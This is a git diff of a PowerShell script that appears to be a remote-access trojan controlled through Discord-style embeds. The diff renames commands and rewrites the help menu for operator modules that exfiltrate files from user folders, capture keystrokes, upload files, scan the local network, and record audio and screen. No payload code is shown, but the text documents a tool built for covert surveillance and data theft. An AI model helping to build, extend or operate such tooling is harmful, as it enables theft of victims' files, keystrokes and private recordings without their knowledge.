@@ -165,11 +165,6 @@ Function Options {
 - **ExtraInfo**: Get a list of further info and command examples
 - **Kill**: Stop a running Module (eg. Keycapture / Exfiltrate)
 - **Close**: Close this Session
-
-
-``````Examples and Info:``````
-- To Exit Exfiltrate or KeyCapture or SpeechToText use **Kill**
-- To use Exfiltrate
 "@
         "color" = 16711680  # Red color
     }
@@ -187,6 +182,8 @@ Function ExtraInfo {
 $embed = @{
     "title" = "Exfiltrate and Upload Command Examples"
     "description" = @"
+``````Example Commands``````
+
 **Default PS Commands:**
 > PS> ``whoami`` (Returns Powershell commands)
 
@@ -194,26 +191,23 @@ $embed = @{
 > PS> ``Exfiltrate -Path Documents -Filetype png``
 > PS> ``Exfiltrate -Filetype log``
 > PS> ``Exfiltrate``
-
 Exfiltrate only will send many pre-defined filetypes
 from all User Folders like Documents, Downloads etc..
 
 **Upload Command Example:**
 > PS> ``Upload -Path C:/Path/To/File.txt``
-
-Use 'Folder-Tree' command to show all files
+Use 'FolderTree' command to show all files
 
 **Enumerate-LAN Example:**
-> PS> ``Enumerate-LAN -Prefix 192.168.1.``
-
+> PS> ``EnumerateLAN -Prefix 192.168.1.``
 This Eg. will scan 192.168.1.1 to 192.168.1.254
 
 **Message Example:**
 > PS> ``Message 'Your Message Here!'``
 
 **Record Examples:**
-> PS> ``Record-Audio -t 100`` (number of seconds to record)
-> PS> ``Record-Screen -t 100`` (number of seconds to record)
+> PS> ``RecordAudio -t 100`` (number of seconds to record)
+> PS> ``RecordScreen -t 100`` (number of seconds to record)
 "@
     "color" = 16711680  # Red color
 }
